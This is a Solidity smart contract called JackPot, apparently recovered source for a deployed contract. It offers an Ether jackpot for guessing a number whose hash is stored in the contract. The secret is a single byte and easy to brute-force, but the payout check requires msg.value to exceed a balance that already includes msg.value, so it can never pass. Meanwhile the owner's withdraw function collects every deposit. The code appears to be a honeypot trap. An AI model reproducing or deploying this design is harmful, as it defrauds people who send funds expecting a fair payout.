/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract JackPot at 0xFD1E3d3E641f224CE8e1117866CF3F01ed2D5D9f
*/
pragma solidity ^0.4.19;

contract JackPot {
    address public owner = msg.sender;
    bytes32 secretNumberHash = 0xee2a4bc7db81da2b7164e56b3649b1e2a09c58c455b15dabddd9146c7582cebc;

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function guess(uint8 number) public payable {
        // each next attempt should be more expensive than previous ones
        if (hashNumber(number) == secretNumberHash && msg.value > this.balance) {
            // send the jack pot
            msg.sender.transfer(this.balance + msg.value);
        }
    }
    
    function hashNumber(uint8 number) public pure returns (bytes32) {
        return keccak256(number);
    }
}